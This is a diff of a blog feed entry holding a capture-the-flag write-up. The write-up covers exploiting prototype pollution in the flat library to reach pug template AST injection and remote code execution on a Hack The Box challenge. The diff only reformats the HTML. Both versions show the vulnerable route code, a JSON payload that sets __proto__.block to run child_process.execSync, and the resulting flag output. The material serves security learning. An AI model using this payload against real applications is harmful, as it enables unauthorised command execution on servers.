@@ -18,50 +18,46 @@
             <description>Access details -&amp;gt; 159.65.31.1:32618
 We are provided with a website which has only one input field and we have the source code available.
 So let&amp;rsquo;s go through the source code which is made available to us.
-Quick Recon   Packages installed (package.json)
-&amp;#34;dependencies&amp;#34;: { &amp;#34;express&amp;#34;: &amp;#34;^4.17.1&amp;#34;, &amp;#34;flat&amp;#34;: &amp;#34;5.0.0&amp;#34;, &amp;#34;pug&amp;#34;: &amp;#34;^3.0.0&amp;#34; }  - We have `pug:3.0.0` which is vulnerable to RCE.- Source: https://github.com/pugjs/pug/issues/3312  Location of vulnerability (routes/index.</description>
+Quick Recon  Packages installed (package.json)  &amp;#34;dependencies&amp;#34;: { &amp;#34;express&amp;#34;: &amp;#34;^4.17.1&amp;#34;, &amp;#34;flat&amp;#34;: &amp;#34;5.0.0&amp;#34;, &amp;#34;pug&amp;#34;: &amp;#34;^3.0.0&amp;#34; }  We have pug:3.0.0 which is vulnerable to RCE. Source: https://github.com/pugjs/pug/issues/3312    Location of vulnerability (routes/index.js)  const pug = require(&amp;#39;pug&amp;#39;); .</description>
             <content type="html"><![CDATA[<p>Access details -&gt; 159.65.31.1:32618</p>
 <p>We are provided with a website which has only one input field and we have the source code available.</p>
 <p>So let&rsquo;s go through the source code which is made available to us.</p>
 <h3 id="quick-recon">Quick Recon</h3>
 <ul>
-<li>
-<p>Packages installed (<code>package.json</code>)</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#e6db74">&#34;dependencies&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> {
-    <span style="color:#f92672">&#34;express&#34;</span>: <span style="color:#e6db74">&#34;^4.17.1&#34;</span>,
-    <span style="color:#f92672">&#34;flat&#34;</span>: <span style="color:#e6db74">&#34;5.0.0&#34;</span>,
-    <span style="color:#f92672">&#34;pug&#34;</span>: <span style="color:#e6db74">&#34;^3.0.0&#34;</span>
-}
-</code></pre></div><pre><code>  - We have `pug:3.0.0` which is vulnerable to RCE.
-  - Source: https://github.com/pugjs/pug/issues/3312
+<li>Packages installed (<code>package.json</code>)</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">		<span style="color:#e6db74">&#34;dependencies&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> {
+			<span style="color:#f92672">&#34;express&#34;</span>: <span style="color:#e6db74">&#34;^4.17.1&#34;</span>,
+			<span style="color:#f92672">&#34;flat&#34;</span>: <span style="color:#e6db74">&#34;5.0.0&#34;</span>,
+			<span style="color:#f92672">&#34;pug&#34;</span>: <span style="color:#e6db74">&#34;^3.0.0&#34;</span>
+		}
+</code></pre></div><ul>
+<li>We have <code>pug:3.0.0</code> which is vulnerable to RCE.</li>
+<li>Source: <a href="https://github.com/pugjs/pug/issues/3312">https://github.com/pugjs/pug/issues/3312</a></li>
+</ul>
+<hr>
+<ul>
+<li>Location of vulnerability (<code>routes/index.js</code>)</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">pug</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;pug&#39;</span>);
 
-</code></pre></li>
-<li>
-<p>Location of vulnerability (<code>routes/index.js</code>)</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">pug</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;pug&#39;</span>);
-
-...
-<span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/api/submit&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
-    <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">artist</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">unflatten</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>);
-  
-    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">artist</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;Haigh&#39;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">artist</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;Westaway&#39;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">artist</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;Gingell&#39;</span>)) {
-        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({
-            <span style="color:#e6db74">&#39;response&#39;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">pug</span>.<span style="color:#a6e22e">compile</span>(<span style="color:#e6db74">&#39;span Hello #{user}, thank you for letting us know!&#39;</span>)({ <span style="color:#a6e22e">user</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;guest&#39;</span> })
-        });
-    } <span style="color:#66d9ef">else</span> {
-        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({
-            <span style="color:#e6db74">&#39;response&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Please provide us with the full name of an existing member.&#39;</span>
-        });
-    }
-});
-</code></pre></div><pre><code>
-</code></pre></li>
-<li>
-<p>Request submitted through <code>/api/submit</code> where body of the request(<code>req.body</code>) is passed to <code>unflatten</code>.</p>
-</li>
-<li>
-<p>So we can pass our payload through the body and when it is unflattened, we can prolly get RCE.</p>
-</li>
+	...
+	<span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/api/submit&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+	    <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">artist</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">unflatten</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>);
+	
+		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">artist</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;Haigh&#39;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">artist</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;Westaway&#39;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">artist</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;Gingell&#39;</span>)) {
+			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({
+				<span style="color:#e6db74">&#39;response&#39;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">pug</span>.<span style="color:#a6e22e">compile</span>(<span style="color:#e6db74">&#39;span Hello #{user}, thank you for letting us know!&#39;</span>)({ <span style="color:#a6e22e">user</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;guest&#39;</span> })
+			});
+		} <span style="color:#66d9ef">else</span> {
+			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({
+				<span style="color:#e6db74">&#39;response&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Please provide us with the full name of an existing member.&#39;</span>
+			});
+		}
+	});
+</code></pre></div><ul>
+<li>Request submitted through <code>/api/submit</code> where body of the request(<code>req.body</code>) is passed to <code>unflatten</code>.</li>
+<li>So we can pass our payload through the body and when it is unflattened, we can prolly get RCE.</li>
 </ul>
 <h3 id="exploiting-the-bug">Exploiting the bug</h3>
 <ul>
@@ -95,22 +91,21 @@ Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close
 <ul>
 <li>Now let&rsquo;s <code>cat</code> the file
 <ul>
-<li>Reques bodyt:
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
-    <span style="color:#f92672">&#34;artist.name&#34;</span>:<span style="color:#e6db74">&#34;Haigh&#34;</span>,<span style="color:#f92672">&#34;__proto__.block&#34;</span>: {
-    <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;Text&#34;</span>, 
-    <span style="color:#f92672">&#34;line&#34;</span>: <span style="color:#e6db74">&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;$(cat flagQLGyS)&#39;)&#34;</span>
-    }
-}
-</code></pre></div><pre><code></code></pre></li>
-<li>Output:</li>
+<li>Reques bodyt:</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">pre</span>&gt;Error: Command failed: $(cat flagQLGyS)&lt;<span style="color:#f92672">br</span>&gt;/bin/sh: HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}: not found
-&lt;<span style="color:#f92672">br</span>&gt; on line 1&lt;<span style="color:#f92672">br</span>&gt;
-</code></pre></div><pre><code>
-</code></pre></li>
+</li>
 </ul>
-<p>References:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">		{
+			<span style="color:#f92672">&#34;artist.name&#34;</span>:<span style="color:#e6db74">&#34;Haigh&#34;</span>,<span style="color:#f92672">&#34;__proto__.block&#34;</span>: {
+	        <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;Text&#34;</span>, 
+	        <span style="color:#f92672">&#34;line&#34;</span>: <span style="color:#e6db74">&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;$(cat flagQLGyS)&#39;)&#34;</span>
+		    }
+		}
+</code></pre></div><pre><code>- Output:
+</code></pre>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">	&lt;<span style="color:#f92672">pre</span>&gt;Error: Command failed: $(cat flagQLGyS)&lt;<span style="color:#f92672">br</span>&gt;/bin/sh: HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}: not found
+	&lt;<span style="color:#f92672">br</span>&gt; on line 1&lt;<span style="color:#f92672">br</span>&gt;
+</code></pre></div><p>References:</p>
 <ul>
 <li>(Peak resource) <a href="https://blog.p6.is/AST-Injection/">https://blog.p6.is/AST-Injection/</a></li>
 </ul>
